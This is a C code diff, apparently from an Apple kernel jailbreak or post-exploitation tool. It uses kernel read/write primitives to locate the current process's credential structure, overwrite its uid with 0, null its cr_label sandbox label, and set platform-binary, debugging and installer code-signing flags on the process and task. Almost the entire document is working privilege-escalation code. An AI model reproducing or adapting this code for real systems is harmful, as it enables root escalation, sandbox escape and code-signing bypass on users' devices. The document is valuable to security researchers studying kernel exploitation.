@@ -341,7 +341,7 @@ int killproc(const char* name) {
 #define CS_GET_TASK_ALLOW  0x00000004
 #define CS_INSTALLER       0x00000008
 
-static const uint32_t UCRED_CR_UID_OFFSET = 0x18;
+#define UCRED_CR_LABEL_OFFSET 0x78
 
 static bool is_valid_csflags(uint32_t v) {
     static const uint32_t known[] = {
@@ -357,6 +357,10 @@ static bool is_valid_csflags(uint32_t v) {
         if (v == known[i]) return true;
     }
     return false;
+}
+
+static bool is_kptr(uint64_t v) {
+    return (v & 0xfffffff000000000ULL) == 0xfffffff000000000ULL;
 }
 
 static uint32_t find_csflags_offset(uint64_t proc) {
@@ -382,10 +386,10 @@ static uint64_t find_ucred_offset(uint64_t proc) {
     uint64_t procsize = PROC_STRUCT_SIZE;
     for (uint32_t off = 0x80; off < procsize - 8; off += 8) {
         uint64_t v = ds_kread64(proc + off);
-        if (v > 0xffffff8000000000ULL) {
-            uint64_t uid_val = ds_kread32(v + UCRED_CR_UID_OFFSET);
+        if (is_kptr(v)) {
+            uint64_t uid_val = ds_kread32(v + 0x18);
             if (uid_val == getuid()) {
-                printf("found ucred at offset 0x%x (ptr=0x%llx)\n", off, v);
+                printf("found ucred at offset 0x%x (ptr=0x%llx uid=%llu)\n", off, v, (uint64_t)uid_val);
                 return off;
             }
         }
@@ -410,9 +414,17 @@ int patchcsflags(void) {
     uint64_t ucred_off = find_ucred_offset(self);
     if (ucred_off) {
         uint64_t ucred = ds_kread64(self + ucred_off);
-        if (ucred) {
-            ds_kwrite32(ucred + UCRED_CR_UID_OFFSET, 0);
+        if (ucred && is_kptr(ucred)) {
+            ds_kwrite32(ucred + 0x18, 0);
             printf("patched uid to 0\n");
+
+            uint64_t cr_label = ds_kread64(ucred + UCRED_CR_LABEL_OFFSET);
+            printf("cr_label before: 0x%llx\n", cr_label);
+            if (cr_label) {
+                ds_kwrite64(ucred + UCRED_CR_LABEL_OFFSET, 0);
+                uint64_t verify = ds_kread64(ucred + UCRED_CR_LABEL_OFFSET);
+                printf("cr_label after: 0x%llx (nulled: %s)\n", verify, verify == 0 ? "yes" : "NO");
+            }
         }
     }
 
@@ -426,6 +438,15 @@ int patchcsflags(void) {
     if (verify != newflags) {
         printf("patchcsflags: verification failed\n");
         return -1;
+    }
+
+    uint64_t task = self + PROC_STRUCT_SIZE;
+    if (is_kptr(task)) {
+        uint32_t taskflags = ds_kread32(task + csflags_off);
+        uint32_t newtaskflags = taskflags | CS_PLATFORM_BINARY | CS_DEBUGGED | CS_GET_TASK_ALLOW | CS_INSTALLER;
+        ds_kwrite32(task + csflags_off, newtaskflags);
+        uint32_t tverify = ds_kread32(task + csflags_off);
+        printf("task csflags: 0x%x -> 0x%x (verified: 0x%x)\n", taskflags, newtaskflags, tverify);
     }
 
     return 0;
